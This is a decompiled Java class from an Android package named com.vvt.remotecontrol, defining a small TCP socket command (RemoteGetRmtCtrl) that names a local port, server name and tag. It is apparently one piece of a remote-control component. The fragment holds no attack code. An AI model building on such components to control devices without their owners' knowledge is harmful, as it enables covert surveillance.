package com.vvt.remotecontrol.command;

import com.fx.socket.TcpSocketCmd;
import com.vvt.remotecontrol.RemoteControlImpl;

public class RemoteGetRmtCtrl
  extends TcpSocketCmd
{
  private static final long serialVersionUID = 2835993111513835995L;
  
  public RemoteGetRmtCtrl()
  {
    super(null, RemoteControlImpl.class);
  }
  
  protected int getPort()
  {
    return 12512;
  }
  
  protected String getServerName()
  {
    return "com.vvt.rmtctrl.server";
  }
  
  protected String getTag()
  {
    return "RemoteGetRmtCtrl";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecontrol/command/RemoteGetRmtCtrl.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */